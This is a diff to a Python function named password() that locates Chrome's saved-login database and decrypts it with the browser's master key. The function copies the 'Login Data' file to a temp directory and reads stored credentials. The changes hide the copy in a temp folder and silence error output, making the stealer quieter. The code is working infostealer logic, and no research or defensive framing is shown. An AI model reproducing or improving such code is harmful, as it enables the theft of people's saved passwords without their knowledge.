@@ -47,8 +47,9 @@ def password():
     master_key = get_master_key()
     for loc in possible_location:
         path_db = main_loc + loc + os.sep + 'Login Data'
-        shutil.copy2(path_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = sqlite3.connect("Loginvault.db")
+        db_loc = temp() + os.sep + "Loginvault.db"
+        shutil.copy2(path_db, db_loc) #making a temp copy since Login Data DB is locked while Chrome is running
+        conn = sqlite3.connect(db_loc)
         cursor = conn.cursor()
         #print(path_db)
         try:
@@ -66,12 +67,12 @@ def password():
                         #print(s)
                 f.close()
         except Exception as e:
-            print(e)
+            #print(e)
             pass
         cursor.close()
         conn.close()
         try:
-            os.remove("Loginvault.db")
+            os.remove(db_loc)
             time.sleep(0.2)
         except Exception as e:
             pass
